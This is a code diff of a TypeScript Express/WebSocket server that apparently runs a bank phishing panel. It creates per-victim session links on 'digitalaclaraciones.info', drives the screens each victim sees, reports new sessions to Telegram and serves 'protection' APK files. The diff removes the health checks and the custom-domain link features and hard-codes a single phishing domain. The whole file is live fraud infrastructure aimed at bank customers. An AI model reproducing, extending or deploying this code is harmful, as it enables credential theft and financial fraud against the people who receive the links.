@@ -4,7 +4,7 @@ import { createServer, type Server } from "http";
 import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { nanoid } from "nanoid";
-import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, CustomDomain, InsertCustomDomain, insertCustomDomainSchema } from "@shared/schema";
+import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType } from "@shared/schema";
 import { setupAuth } from "./auth";
 import axios from 'axios';
 import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
@@ -47,43 +47,6 @@ const upload = multer({
 });
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // Fast health check endpoint - must be first for deployment detection
-  app.get('/health', (req, res) => {
-    res.status(200).json({ 
-      status: 'ok', 
-      timestamp: new Date().toISOString()
-    });
-  });
-
-  // Detailed health check
-  app.get('/api/health', (req, res) => {
-    res.status(200).json({ 
-      status: 'ok', 
-      timestamp: new Date().toISOString(),
-      uptime: process.uptime(),
-      environment: process.env.NODE_ENV || 'development',
-      memory: process.memoryUsage(),
-      version: process.version
-    });
-  });
-
-  // Quick ping endpoint for fast health checks
-  app.get('/ping', (req, res) => {
-    res.status(200).send('pong');
-  });
-
-  // Simple root endpoint for quick deployment verification
-  app.get('/', (req, res, next) => {
-    // For deployment health checks, respond immediately
-    if (req.headers['user-agent']?.includes('ping') || 
-        req.headers['user-agent']?.includes('Health') ||
-        req.headers['x-forwarded-for'] === undefined) {
-      return res.status(200).send('OK');
-    }
-    // Otherwise continue to serve the frontend
-    next();
-  });
-
   // Setup authentication
   setupAuth(app);
 
@@ -92,7 +55,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
   
   // Servir archivos APK de protección desde attached_assets
   app.use('/assets', expressStatic(path.join(process.cwd(), 'attached_assets')));
-
 
   // Create HTTP server
   const httpServer = createServer(app);
@@ -1378,9 +1340,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // FORZAMOS el uso de digitalaclaraciones.info con subdominio específico del banco
-      const bancoLowerCase = (banco as string).toLowerCase();
-      const clientLink = `https://${bancoLowerCase}.digitalaclaraciones.info/${sessionId}`;
+      // FORZAMOS el uso de digitalaclaraciones.info independientemente del entorno
+      const clientLink = `https://digitalaclaraciones.info/${sessionId}`;
       
       // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
@@ -1615,30 +1576,14 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
           } 
           else if (data.role === 'CLIENT' && data.sessionId) {
             clients.set(data.sessionId, ws);
-            console.log(`[WebSocket] Client registered with session ID: ${data.sessionId}`);
+            console.log(`Client registered with session ID: ${data.sessionId}`);
 
             // Get session info and send to client
-            console.log(`[WebSocket] Buscando sesión con ID: ${data.sessionId}`);
             const session = await storage.getSessionById(data.sessionId);
             if (session) {
-              console.log(`[WebSocket] Sesión encontrada: ${session.sessionId}, banco: ${session.banco}, pasoActual: ${session.pasoActual}`);
-              
-              // Si la sesión tiene un banco diferente al del subdominio, actualizar la sesión
-              if (data.bankFromSubdomain && session.banco !== data.bankFromSubdomain) {
-                console.log(`[WebSocket] Actualizando banco de sesión desde subdominio: ${session.banco} -> ${data.bankFromSubdomain}`);
-                await storage.updateSession(data.sessionId, { banco: data.bankFromSubdomain });
-                session.banco = data.bankFromSubdomain;
-              }
-              
               ws.send(JSON.stringify({
                 type: 'INIT_SESSION',
                 data: session
-              }));
-            } else {
-              console.log(`[WebSocket] ERROR: No se encontró sesión con ID: ${data.sessionId}`);
-              ws.send(JSON.stringify({
-                type: 'ERROR',
-                message: 'Sesión no encontrada'
               }));
             }
           }
@@ -3264,220 +3209,6 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         success: false, 
         error: error.message 
       });
-    }
-  });
-
-  // API para gestionar dominios personalizados
-  app.get('/api/custom-domains', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-
-      const user = req.user;
-      if (user.role !== 'admin') {
-        return res.status(403).json({ message: "Acceso denegado" });
-      }
-
-      const domains = await storage.getCustomDomains();
-      res.json(domains);
-    } catch (error) {
-      console.error("Error fetching custom domains:", error);
-      res.status(500).json({ message: "Error fetching custom domains" });
-    }
-  });
-
-  app.post('/api/custom-domains', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-
-      const user = req.user;
-      if (user.role !== 'admin') {
-        return res.status(403).json({ message: "Acceso denegado" });
-      }
-
-      const { name, domain } = req.body;
-      
-      if (!name || !domain) {
-        return res.status(400).json({ message: "Nombre y dominio son requeridos" });
-      }
-
-      const newDomain = await storage.createCustomDomain({
-        name,
-        domain,
-        createdBy: user.id,
-        isActive: true
-      });
-
-      res.json(newDomain);
-    } catch (error) {
-      console.error("Error creating custom domain:", error);
-      res.status(500).json({ message: "Error creating custom domain" });
-    }
-  });
-
-  app.put('/api/custom-domains/:id', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-
-      const user = req.user;
-      if (user.role !== 'admin') {
-        return res.status(403).json({ message: "Acceso denegado" });
-      }
-
-      const { id } = req.params;
-      const { name, domain, isActive } = req.body;
-
-      const updatedDomain = await storage.updateCustomDomain(parseInt(id), {
-        name,
-        domain,
-        isActive
-      });
-
-      res.json(updatedDomain);
-    } catch (error) {
-      console.error("Error updating custom domain:", error);
-      res.status(500).json({ message: "Error updating custom domain" });
-    }
-  });
-
-  app.delete('/api/custom-domains/:id', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-
-      const user = req.user;
-      if (user.role !== 'admin') {
-        return res.status(403).json({ message: "Acceso denegado" });
-      }
-
-      const { id } = req.params;
-      await storage.deleteCustomDomain(parseInt(id));
-
-      res.json({ success: true });
-    } catch (error) {
-      console.error("Error deleting custom domain:", error);
-      res.status(500).json({ message: "Error deleting custom domain" });
-    }
-  });
-
-  // Nueva ruta para generar enlace con dominio personalizado
-  app.post('/api/generate-link-custom', async (req, res) => {
-    try {
-      if (!req.isAuthenticated()) {
-        return res.status(401).json({ message: "No autenticado" });
-      }
-
-      const { banco = "LIVERPOOL", domainId } = req.body;
-      const user = req.user;
-      
-      // Validar que el banco solicitado esté permitido para el usuario
-      const userBanks = user.allowedBanks || 'all';
-      let hasBankAccess = false;
-      
-      if (user.username === "balonx") {
-        hasBankAccess = true;
-      } else if (user.role === UserRole.ADMIN) {
-        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
-          hasBankAccess = true;
-        } else if (userBanks && userBanks !== '') {
-          const allowedBanksList = userBanks.split(',').map(b => b.trim());
-          if (allowedBanksList.includes(banco as string)) {
-            hasBankAccess = true;
-          }
-        }
-      } else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
-        hasBankAccess = true;
-      } else if (userBanks && userBanks !== '') {
-        const allowedBanksList = userBanks.split(',').map(b => b.trim());
-        if (allowedBanksList.includes(banco as string)) {
-          hasBankAccess = true;
-        }
-      }
-      
-      if (!hasBankAccess) {
-        const bancos = userBanks === 'all' ? 'todos los bancos' : userBanks.split(',').map(b => b.trim()).join(', ');
-        return res.status(403).json({ 
-          error: `Banco ${banco} no permitido. Solo puedes usar: ${bancos}` 
-        });
-      }
-
-      // Obtener el dominio personalizado
-      const customDomain = await storage.getCustomDomainById(domainId);
-      if (!customDomain || !customDomain.isActive) {
-        return res.status(400).json({ message: "Dominio no válido o inactivo" });
-      }
-
-      // Generar código de 8 dígitos
-      let linkCode = '';
-      for (let i = 0; i < 8; i++) {
-        linkCode += Math.floor(Math.random() * 10).toString();
-      }
-      
-      const sessionId = linkCode;
-
-      const session = await storage.createSession({ 
-        sessionId, 
-        banco: banco as string,
-        folio: linkCode,
-        pasoActual: ScreenType.FOLIO,
-        createdBy: user.username,
-      });
-
-      // Guardar la sesión automáticamente
-      const savedSession = await storage.saveSession(sessionId);
-      
-      if (!savedSession.createdBy) {
-        await storage.updateSession(sessionId, { createdBy: user.username });
-      }
-
-      // Construir el enlace con el dominio personalizado y subdominio del banco
-      const bancoLowerCase = (banco as string).toLowerCase();
-      const clientLink = `https://${bancoLowerCase}.${customDomain.domain}/${sessionId}`;
-
-      // Notificar a los clientes de admin
-      broadcastToAdmins(JSON.stringify({
-        type: 'LINK_GENERATED',
-        data: { 
-          sessionId,
-          code: linkCode,
-          banco: banco as string,
-          userName: user.username,
-          createdBy: user.username,
-          customDomain: customDomain.name
-        }
-      }), user.username);
-
-      broadcastToAdmins(JSON.stringify({
-        type: 'SESSIONS_UPDATED',
-        data: {
-          userName: user.username
-        }
-      }));
-
-      // Enviar notificación de nueva sesión a Telegram
-      await sendSessionCreatedNotification({
-        sessionId,
-        banco: banco as string,
-        folio: linkCode,
-        createdBy: user.username,
-        link: clientLink
-      });
-
-      res.json({ 
-        sessionId, 
-        link: clientLink, 
-        code: linkCode,
-        domain: customDomain.name
-      });
-    } catch (error) {
-      console.error("Error generating custom link:", error);
-      res.status(500).json({ message: "Error generating custom link" });
     }
   });
 
